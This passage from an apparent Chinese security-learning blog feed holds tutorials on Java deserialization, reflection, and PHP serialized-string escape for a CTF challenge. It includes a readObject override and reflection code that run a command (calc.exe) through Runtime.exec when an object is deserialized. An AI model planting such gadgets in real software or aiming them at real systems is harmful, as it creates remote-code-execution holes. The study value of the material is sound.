objectOutputStream.writeObject(people);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650605.png" alt="QQ截图20220227163104"></p><p>生成的二进制文件看不懂。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        System.out.println(o);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650623.png" alt="QQ截图20220227163615"></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这里就不一一复现<code>transient</code>关键字了</p><h2 id="利用反序列化漏洞"><a href="#利用反序列化漏洞" class="headerlink" title="利用反序列化漏洞"></a>利用反序列化漏洞</h2><p>之前学习了反射弹计算器。这里试着用java反序列化复现一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>此时如果在经过序列化，反序列化，就会弹出计算器。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271648736.png" alt="QQ截图20220227164828"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>    in.defaultReadObject();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>    declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>详细解释一下下面这串代码中的细节。</p><ul><li>重写了一下readObject这个方法。</li><li><code>in.defaultReadObject()</code>调用原始的readObject方法</li><li>利用反射。</li></ul>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深度理解反射</title>
    <link href="/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="深度理解反射"><a href="#深度理解反射" class="headerlink" title="深度理解反射"></a>深度理解反射</h1><h2 id="区别类的初始化和类的实例化"><a href="#区别类的初始化和类的实例化" class="headerlink" title="区别类的初始化和类的实例化"></a>区别类的初始化和类的实例化</h2><h3 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是初始块&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是静态初始块&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是构造函数&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class.forName(<span class="hljs-string">&quot;xsw6a.Demo1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271507364.png"></p><p>这里仅仅只是执行了静态初始。即当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。</p><h3 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271509598.png" alt="QQ截图20220227150956"></p><p>执行顺序。</p><h2 id="利用反射弹出计算器（后续漏洞基本都要用到）"><a href="#利用反射弹出计算器（后续漏洞基本都要用到）" class="headerlink" title="利用反射弹出计算器（后续漏洞基本都要用到）"></a>利用反射弹出计算器（后续漏洞基本都要用到）</h2><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h3><p>获取某类中的方法：Class.forName(“java.lang.Runtime”).getMethod(“exec”, String.class)</p><p>获取Runtime类下的exec方法。</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3><p>**invoke(类对象，exec方法传入的参数)**，这里的类对象必须是已经实例化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(m,<span class="hljs-string">&quot;clac.exe&quot;</span>);<span class="hljs-comment">//调用实例化对象并且传入参数</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里产生了报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271536031.png" alt="QQ截图20220227153541"></p><p>私类构造函数无法直接进行<code>newInstance()</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271537610.png" alt="QQ截图20220227153650"></p><h3 id="非暴力"><a href="#非暴力" class="headerlink" title="非暴力"></a>非暴力</h3><p><strong>这里Runtime类可以通过getRuntime方法返回一个对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271556483.png" alt="QQ截图20220227155543"></p><h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructors</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructors.setAccessible(<span class="hljs-literal">true</span>);<br>        clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructors.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271611004.png" alt="QQ截图20220227161118"></p><p>重要的是开启<code>.setAccessible(true);</code></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化之字符串逃逸（变短）</title>
    <link href="/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/"/>
    <url>/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化之字符逃逸（变短）"><a href="#PHP反序列化之字符逃逸（变短）" class="headerlink" title="PHP反序列化之字符逃逸（变短）"></a>PHP反序列化之字符逃逸（变短）</h1><p>今天做buuctf上得题时候，就来学习一下。搜寻资料此类题型有两种方法。</p><h2 id="替换修改后导致序列化字符串变长"><a href="#替换修改后导致序列化字符串变长" class="headerlink" title="替换修改后导致序列化字符串变长"></a>替换修改后导致序列化字符串变长</h2><p>目前还没有碰到。</p><h2 id="替换修改后导致序列化字符串边短"><a href="#替换修改后导致序列化字符串边短" class="headerlink" title="替换修改后导致序列化字符串边短"></a>替换修改后导致序列化字符串边短</h2><p>简单说一下。(如果不懂php反序列化就别往下看了)<br>首先我们要了解php反序列化后得字符串<strong>：PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的</strong></p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456601.png" alt="QQ截图20220227142612"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;s:<span class="hljs-number">33</span>:<span class="hljs-string">&quot;stop water and stop power college&quot;</span>;&#125;&quot;<br></code></pre></td></tr></table></figure><p>那么什么叫字符串逃逸呢？</p><p><strong>首先第一点，在后续的利用过程中只会利用这一段。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>假如这里添加一层过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter_arr</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//这变成了一个正则表达式了哦</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>);<span class="hljs-comment">//看一下img里面有没有filter的东西，有的话，换成空格</span><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">filter</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>))));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271432213.png" alt="QQ截图20220227143230"></p><p>清楚可见这里得<code>phpflag</code>被过滤替换为空。这里实际的对应值如下。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">s<span class="hljs-number"> 7 </span>;s:31: <span class="hljs-comment">#第一个</span><br>s<span class="hljs-number"> 5 </span>xsw6a  <span class="hljs-comment">#第二个</span><br>s<span class="hljs-number"> 2 </span>zx     <span class="hljs-comment">#第三个</span><br>s<span class="hljs-number"> 1 </span>1      <span class="hljs-comment">#第四个</span><br></code></pre></td></tr></table></figure><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456805.png" alt="QQ截图20220227143810"></h3><p>读代码。<br>依次分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤而已。</p><p><strong>补充</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456400.png" alt="QQ截图20220227144023"></p><p>如果键名包含数字好像这里绕不过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>销毁session。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br></code></pre></td></tr></table></figure><p>重新传入参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure><p>这个函数简单理解来说，就是可以直接覆盖上面的session值。本地实验如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span 